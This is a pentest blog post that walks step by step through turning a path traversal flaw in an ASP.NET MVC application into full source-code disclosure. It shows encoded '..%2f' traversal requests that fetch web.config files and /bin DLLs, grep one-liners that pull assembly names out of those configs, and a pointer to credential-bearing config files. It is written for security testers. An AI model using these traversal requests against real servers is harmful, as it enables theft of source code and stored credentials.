---
title: "From Path Traversal to Source Code in AspNET MVC Applications"
date: 2018-10-09T08:30:00.002-07:00
draft: false
type: posts
categories: 
- asp.net,dll,download,mvc,path traversal,source code
---
# From Path Traversal to Source Code in AspNET MVC Applications

<br/>

<br/>
### Introduction

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhsHIkRKLrs3XbNHW0sut9RbCya5Y54zwOXlQk4Qf_p-zZszXrne_HON_sdL4qzF-ZlzkgTqQZVtCEH0WDaiJK_Wo_7N9X5VutTEuWZvdp9POoX04n0AO_lReMaOXnUHHtw3xPJitLUdW9W/s320/1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhsHIkRKLrs3XbNHW0sut9RbCya5Y54zwOXlQk4Qf_p-zZszXrne_HON_sdL4qzF-ZlzkgTqQZVtCEH0WDaiJK_Wo_7N9X5VutTEuWZvdp9POoX04n0AO_lReMaOXnUHHtw3xPJitLUdW9W/s1600/1.png)Model-View-Controller web applications may be difficult to pentest, since they strongly depend -for almost any aspect- on the technology they are developed and deployed with. From the attacker perspective, interacting with a complex multi-layer web application means dealing with very technology-dependent configuration files and implementations; on the contrary, classic web applications (such as WebForms) present a more traditional and simple structure, where looking interesting data and handlers may be easier. 

@page { margin: 0.79in } p { margin-bottom: 0.1in; direction: ltr; line-height: 115%; text-align: left; orphans: 2; widows: 2 } p.western { so-language: en-US }  

In this post we will describe a series of steps, based on real world experience, to exploit a Path Traversal vulnerability and reach a full disclosure of source code, by downloading and decompiling DLLs of a Model-View-Controller application within .Net MVC architecture and [Razor](https://www.c-sharpcorner.com/article/learn-about-razor-view-engine/) as the View Engine.  
  

### Prerequisite

A Path Traversal vulnerability is present on the target application, and the standard web.config file can be downloaded.

  

**Note:** most recent IIS versions and, in general, hardened installations, do not allow web handlers to retrieve files outside their sandbox or scope (i.e. the root folder of the web application, for example c:\\inetpub\\wwwroot\\application\_name\\)  
  

### Main structure

As any .Net application, MVC applications have a web.config file, where "assemblyIdentity" XML tags identifies every binary file the application uses.

  
Request:

GET /download\_page?id=**..%2f..%2fweb.config** HTTP/1.1  
Host: example-mvc-application.minded  
\[...\]

  
Response:

HTTP/1.1 200 OK  
\[...\]

<?xml version="1.0" encoding="utf-8"?>

<configuration>  
  <configSections>  
    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral" requirePermission="false" />  
  </configSections>  
  <appSettings>  
    <add key="webpages:Version" value="3.0.0.0" />  
    <add key="webpages:Enabled" value="false" />  
    <add key="ClientValidationEnabled" value="true" />  
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />  
  </appSettings>  
<system.web>  
  <authentication mode="None" />  
  <compilation debug="true" targetFramework="4.6.1" />  
  <httpRuntime targetFramework="4.6.1" />  
</system.web>  
<system.webServer>  
  <modules>  
    <remove name="FormsAuthentication" />  
  </modules>  
</system.webServer>  
<runtime>  
  <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">  
    <dependentAssembly>  
      <**assemblyIdentity** name="Microsoft.Owin.Security" />  
      <bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />  
    </dependentAssembly>  
    <dependentAssembly>  
      <**assemblyIdentity** name="Microsoft.Owin.Security.OAuth" />  
      <bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />  
    </dependentAssembly>  
    <dependentAssembly>  
      <**assemblyIdentity** name="Microsoft.Owin.Security.Cookies" />  
      <bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />  
    </dependentAssembly>  
    <dependentAssembly>  
      <**assemblyIdentity** name="Microsoft.Owin" />  
      <bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />  
    </dependentAssembly>  
    <dependentAssembly>  
      <**assemblyIdentity** name="Newtonsoft.Json" culture="neutral" />  
      <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />  
    </dependentAssembly>  
    <dependentAssembly>  
      <**assemblyIdentity** name="System.Web.Optimization" />  
      <bindingRedirect oldVersion="1.0.0.0-1.1.0.0" newVersion="1.1.0.0" />  
    </dependentAssembly>  
    <dependentAssembly>  
      <**assemblyIdentity** name="WebGrease" />  
      <bindingRedirect oldVersion="0.0.0.0-1.5.2.14234" newVersion="1.5.2.14234" />  
    </dependentAssembly>  
    <dependentAssembly>  
      <**assemblyIdentity** name="System.Web.Helpers" />  
      <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />  
    </dependentAssembly>

    <dependentAssembly>  
      <**assemblyIdentity** name="System.Web.Mvc" />  
      <bindingRedirect oldVersion="1.0.0.0-5.2.3.0" newVersion="5.2.3.0" />  
    </dependentAssembly>  
    <dependentAssembly>  
      <**assemblyIdentity** name="System.Web.WebPages" />  
      <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />  
    </dependentAssembly>  
  </assemblyBinding>  
</runtime>  
<entityFramework>  
  <defaultConnectionFactory type="System.Data.Entity.Infrastructure.LocalDbConnectionFactory, EntityFramework">  
    <parameters>  
      <parameter value="mssqllocaldb" />  
    </parameters>  
  </defaultConnectionFactory>  
  <providers>  
      <provider invariantName="System.Data.SqlClient" type="System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer" />  
  </providers>  
</entityFramework>  
  <system.codedom>  
    <compilers>  
      <compiler language="c#;cs;csharp" extension=".cs" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=1.0.0.0, Culture=neutral” warningLevel="4" compilerOptions="/langversion:6 /nowarn:1659;1699;1701" />  
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=1.0.0.0, Culture=neutral" warningLevel="4" compilerOptions="/langversion:14 /nowarn:41008 /define:\_MYTYPE=\\&quot;Web\\&quot; /optionInfer+" />  
    </compilers>  
  </system.codedom>  
</configuration>  
  

Other files that could be found in the root directory of a .Net application:

#### /global.asax

<%@ Application Codebehind="Global.asax.cs" Inherits="WebApplication1.MvcApplication" Language="C#" %>  
  

#### /connectionstrings.config

**Note:** this file contains passwords!  
  

<connectionStrings>  
  <add name="DefaultConnection" **connectionString**\="Data Source=(LocalDb)\\MSSQLLocalDB;AttachDbFilename \[...\]" providerName="System.Data.SqlClient" />  
</connectionStrings>

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbnHsuSBNrBZgsHTGBopoPo6jxngDgQe8dbUazsqAPZctQnX_JWnVXKGWQDjgNzAIL5Af2-cDku664ZyekH18Qd_TIDCtcWDCSqw_Kt5e62_QmH69qe4qTrhqsXD4ujL8FJb8obGuH3yJQ/s640/2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbnHsuSBNrBZgsHTGBopoPo6jxngDgQe8dbUazsqAPZctQnX_JWnVXKGWQDjgNzAIL5Af2-cDku664ZyekH18Qd_TIDCtcWDCSqw_Kt5e62_QmH69qe4qTrhqsXD4ujL8FJb8obGuH3yJQ/s1600/2.png)  

  
In addition, .Net MVC applications are structured to define other web.config files, having the aim to include any declaration for specific namespaces for each set of viewpages, relieving developers to declare “@using” namespaces in every file.  
As shown in the picture, representing a VisualStudio MVC/Razor project for a simple application, the main Views folder includes a web.config file:

-   /Views/Web.config

**Note:** the /Views folder is part of the Razor View Engine configuration.  
  

If the application uses Areas, consider that each Area with graphical interface capabilities could have a dedicated ./Views folder containing a Web.config file for further specific namespaces.

-   <area-name-1>/Views/web.config
-   <area-name-2>/Views/web.config

  
Any /Views and <area-name>/Views directory may contain a web.config file, that can be downloaded via the former Path Traversal.  
  
Web.config files may refer to other classes via the "type=" attribute, as well as new namespaces.  
  

Request:

GET /download\_page?id=**..%2f..%2fViews/web.config** HTTP/1.1

Host: example-mvc-application.minded

\[...\]

  

Response:  
HTTP/1.1 200 OK

\[...\]

<?xml version="1.0"?>  
<configuration>  
  <configSections>

    <sectionGroup name="system.web.webPages.razor" **type**\="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral">  
    <section name="host" **type**\="System.Web.WebPages.Razor.Configuration.HostSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />  
    <section name="pages" **type**\="System.Web.WebPages.Razor.Configuration.RazorPagesSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />  
    </sectionGroup>

  </configSections>  
<system.web.webPages.razor><host factoryType="System.Web.Mvc.MvcWebRazorHostFactory, System.Web.Mvc, Version=5.2.3.0, Culture=neutral" /><pages pageBaseType="System.Web.Mvc.WebViewPage">  
  <namespaces>  
    <add **namespace**\="System.Web.Mvc" />  
    <add **namespace**\="System.Web.Mvc.Ajax" />  
    <add **namespace**\="System.Web.Mvc.Html" />  
    <add **namespace**\="System.Web.Optimization"/>  
    <add **namespace**\="System.Web.Routing" />  
    **_<add namespace="WebApplication1" />_**  
  </namespaces>  
</pages>  
</system.web.webPages.razor>  
<appSettings><add key="webpages:Enabled" value="false" /></appSettings>  
<system.webServer><handlers><remove name="BlockViewHandler"/><add name="BlockViewHandler" path="\*" verb="\*" preCondition="integratedMode" type="System.Web.HttpNotFoundHandler" /></handlers></system.webServer>  
<system.web><compilation><assemblies><add assembly="System.Web.Mvc, Version=5.2.3.0, Culture=neutral” /></assemblies></compilation></system.web></configuration>  
  

### Download the first DLL

From a very shallow analysis, the declaration of a custom namespace (since other namespaces are defaults) suggests that a DLL called "WebApplication1" is present in the /bin directory.

  

Request:

GET /download\_page?id=**..%2f..%2fbin/WebApplication1.dll** HTTP/1.1  
Host: example-mvc-application.minded  
\[...\]  
  
Response:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiV1MjChhqW9OGvOoiTF3B_aM9rSN8FJDosSh2fwKMvrgsTDTnWXKimVvS5WknDxAufn2bLMsev2APDgYlkohUib8lwQVWsUx1h9WBYEhpvzD_23sHd2VlOjlUoNZmj9UoV6lq7STkJmezh/s1600/3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiV1MjChhqW9OGvOoiTF3B_aM9rSN8FJDosSh2fwKMvrgsTDTnWXKimVvS5WknDxAufn2bLMsev2APDgYlkohUib8lwQVWsUx1h9WBYEhpvzD_23sHd2VlOjlUoNZmj9UoV6lq7STkJmezh/s1600/3.png)

  

  

  
  
  
  
  
  
Therefore, the DLL file can be decompiled with tools like [.NET Reflector](https://www.red-gate.com/products/dotnet-development/reflector/index), in order to obtain the source code of the related part of the web application, and additional information to advance in the attack.  
  

Decompiling the main DLL shows several details about the internal structure of the application, and its dependencies and modules.

In fact, Area names, which are the semi-independent sections a MVC application is divided in, are defined in the binary of the main namespace / Web Application:

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyOIhmzePG1CrWRoSaO705lmAhA4rwFKauyTE3Pq2-kgudvSULtLGOBBHdJs41WWNyovpTJ0InOzTKb2zNZycsi7FogDCdLUStUYRAc_SB5mt-LKTzHWFVrSrLZsmXLUcI4fkFuyLJOrBQ/s640/4.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyOIhmzePG1CrWRoSaO705lmAhA4rwFKauyTE3Pq2-kgudvSULtLGOBBHdJs41WWNyovpTJ0InOzTKb2zNZycsi7FogDCdLUStUYRAc_SB5mt-LKTzHWFVrSrLZsmXLUcI4fkFuyLJOrBQ/s1600/4.png)

####   
Results

-   The namespace **WebApplication1.Areas.Minded** corresponds to the namesake area, i.e. a section of the application which is most likely to be accessed with a path similar to _**https://example-mvc-application.minded/area-name/**_.
-   **Routeconfig.cs** file has been extracted to understand the specific rules the application follows to translate URLs to Controllers (which can be considered as the web handlers of the application).

  

### Extend the attack surface

From the definition of an Area, an attacker can infer that other web.config files are present in the application, in guessable/default paths as /area-name/Views/, containing specific configurations that may refer to other DLL files present in the /bin folder.  
  
Request:  
GET /download\_page?id=**..%2f..%2fMinded/Views/web.config** HTTP/1.1  
Host: example-mvc-application.minded  
\[...\]  
  
Response:  
HTTP/1.1 200 OK  
\[...\]  
<?xml version="1.0"?>  
<configuration>  
<configSections>  
  <sectionGroup name="system.web.webPages.razor" **type**\="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral">  
    <section name="host" **type**\="System.Web.WebPages.Razor.Configuration.HostSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />  
    <section name="pages" **type**\="System.Web.WebPages.Razor.Configuration.RazorPagesSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral” requirePermission="false" />  
  </sectionGroup>  
</configSections>  
<system.web.webPages.razor><host factoryType="System.Web.Mvc.MvcWebRazorHostFactory, System.Web.Mvc, Version=5.2.3.0, Culture=neutral" />  
<pages pageBaseType="System.Web.Mvc.WebViewPage">  
<namespaces>  
  <add **namespace**\="System.Web.Mvc" />  
  <add **namespace**\="System.Web.Mvc.Ajax" />  
  <add **namespace**\="System.Web.Mvc.Html" />  
  <add **namespace**\="System.Web.Routing" />  
  <add **namespace**\="System.Web.Optimization" />  
  <add **namespace**\="WebApplication1" />  
  **_<add namespace="WebApplication1.AdditionalFeatures" />_**  
</namespaces>  
</pages>  
</system.web.webPages.razor>  
<appSettings><add key="webpages:Enabled" value="false" /></appSettings>  
<system.webServer><handlers><remove name="BlockViewHandler"/><add name="BlockViewHandler" path="\*" verb="\*" preCondition="integratedMode" type="System.Web.HttpNotFoundHandler" /></handlers>  
</system.webServer>  
</configuration>  
  

#### Attacker's loot so far

C:\\WebApplication1> dir /b /s web.config

C:\\WebApplication1\\Web.config

C:\\WebApplication1\\Views\\Web.config

C:\\WebApplication1\\Areas\\Minded\\Views\\web.config  
  

All the web.config files have been downloaded, and they can be inspected for specific references, disclosing details on the /bin directory.

  

### Filename extraction cheat-sheet

The most relevant XML tags, an attacker should look to identify DLLs of a MVC application, are the declarations of namespaces, the inclusion of assembly files, ant any reference to types.

-   "namespace"
-   "assemblyIdentity"
-   " type="

  

#### Extract additional namespaces

Every web.config file, both for Areas and for the main Views configuration, includes references to any namespace it depends on:  
  

**$ grep -Ri namespace | grep -v namespaces | cut -d'"' -f 1-2**  
  
  
Areas/Minded/Views/web.config: <add namespace="**System.Web.Mvc**  
Areas/Minded/Views/web.config: <add namespace="**System.Web.Mvc.Ajax**Areas/Minded/Views/web.config: <add namespace="**System.Web.Mvc.Html**  
Areas/Minded/Views/web.config: <add namespace="**System.Web.Routing**  
Areas/Minded/Views/web.config: <add namespace="**System.Web.Optimization**  
Areas/Minded/Views/web.config: <add namespace="**WebApplication1**  
Areas/Minded/Views/web.config: <add namespace="**WebApplication1.AdditionalFeatures**  
Views/Web.config: <add namespace="**System.Web.Mvc**  
Views/Web.config: <add namespace="**System.Web.Mvc.Ajax**  
Views/Web.config: <add namespace="**System.Web.Mvc.Html**  
Views/Web.config: <add namespace="**System.Web.Optimization**  
Views/Web.config: <add namespace="**System.Web.Routing**  
Views/Web.config: <add namespace="**WebApplication1**  
  
Extract additional assemblies that are referenced within the web application  
Binary files (Assembly) the application needs to work properly are declared in the main web.config file:  
  
**$ grep -Ri assemblyidentity | cut -d'"' -f 1-2**  
Web.config: <assemblyIdentity name="**Microsoft.Owin.Security**  
Web.config: <assemblyIdentity name="**Microsoft.Owin.Security.OAuth**  
Web.config: <assemblyIdentity name="**Microsoft.Owin.Security.Cookies**  
Web.config: <assemblyIdentity name="**Microsoft.Owin**  
Web.config: <assemblyIdentity name="**Newtonsoft.Json**  
Web.config: <assemblyIdentity name="**System.Web.Optimization**  
Web.config: <assemblyIdentity name="**WebGrease**  
Web.config: <assemblyIdentity name="**System.Web.Helpers**  
Web.config: <assemblyIdentity name="**System.Web.Mvc**  
Web.config: <assemblyIdentity name="**System.Web.WebPages**  
  

#### Extract section group’s namespaces

Within the SectionGroup XML element of a web.config file, the rightmost value of the “type” attribute before the Version refers to additional namespaces the application may need:

  
**$ grep -ri " type=" | grep -v compiler | cut -d'"' -f 1-4**  
Areas/Minded/Views/web.config: <sectionGroup name="system.web.webPages.razor" **type**\="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, **System.Web.WebPages.Razor**, Version=3.0.0.0, Culture=neutral  
Areas/Minded/Views/web.config: <section name="host" **type**\="System.Web.WebPages.Razor.Configuration.HostSection, **System.Web.WebPages.Razor**, Version=3.0.0.0, Culture=neutral  
Areas/Minded/Views/web.config: <section name="pages" **type**\="System.Web.WebPages.Razor.Configuration.RazorPagesSection, **System.Web.WebPages.Razor**, Version=3.0.0.0, Culture=neutral  
Areas/Minded/Views/web.config: <add name="BlockViewHandler" path="\*  
Views/Web.config: <sectionGroup name="system.web.webPages.razor" **type**\="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, **System.Web.WebPages.Razor**, Version=3.0.0.0, Culture=neutral  
Views/Web.config: <section name="host" **type**\="System.Web.WebPages.Razor.Configuration.HostSection, S**ystem.Web.WebPages.Razor**, Version=3.0.0.0, Culture=neutral  
Views/Web.config: <section name="pages" **type**\="System.Web.WebPages.Razor.Configuration.RazorPagesSection, **System.Web.WebPages.Razor**, Version=3.0.0.0, Culture=neutral  
Views/Web.config: <add name="BlockViewHandler" path="\*  
Web.config: <section name="entityFramework" **type**\="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, **EntityFramework**, Version=6.0.0.0, Culture=neutral  
Web.config: <defaultConnectionFactory **type**\="System.Data.Entity.Infrastructure.LocalDbConnectionFactory, **EntityFramework**">  
Web.config: <provider invariantName="System.Data.SqlClient" **type**\="System.Data.Entity.SqlServer.SqlProviderServices, **EntityFramework.SqlServer**  
  
Thus, several files can be downloaded:  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwndEXx1W_9vmjTStwLXwA-jBg5JhKpZrYhlK8T_bUb5julOvhK2pXnLaSe-RYbmrWqTLBm-W5BUly8xHn5_zqcl9s_a-RE-T2LqROIrkkggVDHKSYPxb8I7iaCeh3bDDBBpyistXRnjzf/s1600/6.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwndEXx1W_9vmjTStwLXwA-jBg5JhKpZrYhlK8T_bUb5julOvhK2pXnLaSe-RYbmrWqTLBm-W5BUly8xHn5_zqcl9s_a-RE-T2LqROIrkkggVDHKSYPxb8I7iaCeh3bDDBBpyistXRnjzf/s1600/6.png)-   EntityFramework.dll
-   EntityFramework.SqlServer.dll
-   Microsoft.Owin.dll
-   Microsoft.Owin.Security.dll
-   Microsoft.Owin.Security.Cookies.dll
-   Microsoft.Owin.Security.OAuth.dll
-   Newtonsoft.Json.dll
-   System.Web.Helpers.dll
-   System.Web.Mvc.dll
-   System.Web.Mvc.Ajax.dll
-   System.Web.Mvc.Html.dll
-   System.Web.Optimization.dll
-   System.Web.Routing.dll
-   System.Web.WebPages.dll
-   System.Web.WebPages.Razor.dll
-   WebApplication1.dll
-   **WebApplication1.AdditionalFeatures.dll**
-   WebGrease.dll

  
Example of request:  
GET /download\_page?id=..%2f..%2fbin/<DLL NAME>.dll HTTP/1.1  
Host: example-mvc-application.minded  
\[...\]  
  

For the sake of completeness, it must be said that these steps allow an attacker to initiate a grey-box analysis against the web application. In fact, the /bin folder of the target application itself includes several additional DLLs which are referenced by inner libraries.

  

To understand the gap between the actual /bin folder content and the result of the described technique, the picture shows the real content of the folder, from the internal perspective.

  

Besides, downloaded DLL files can be treated as any other DLL, which means their dependencies can be listed and they can be decompiled, to investigate more deeply.

  
  

### References

-   https://msdn.microsoft.com/en-us/library/w7w4sb0w.aspx
-   https://docs.microsoft.com/it-it/aspnet/core/mvc/controllers/areas?view=aspnetcore-2.1
-   https://www.infragistics.com/community/blogs/b/dhananjay\_kumar/posts/areas-in-asp-net-mvc
-   https://www.red-gate.com/products/dotnet-development/reflector/index
-   https://visualstudiomagazine.com/articles/2014/10/28/asp-net-mvc-5-1-new.aspx
-   https://www.davidhayden.me/blog/asp-net-mvc-5-attribute-routing
-   https://www.c-sharpcorner.com/article/learn-about-razor-view-engine/
-   https://www.ecanarys.com/Blogs/ArticleID/271/THE-RAZOR-VIEW-ENGINE-IN-MVC

#### [Source](https://blog.mindedsecurity.com/feeds/4763117556629568058/comments/default)

<br/>
---
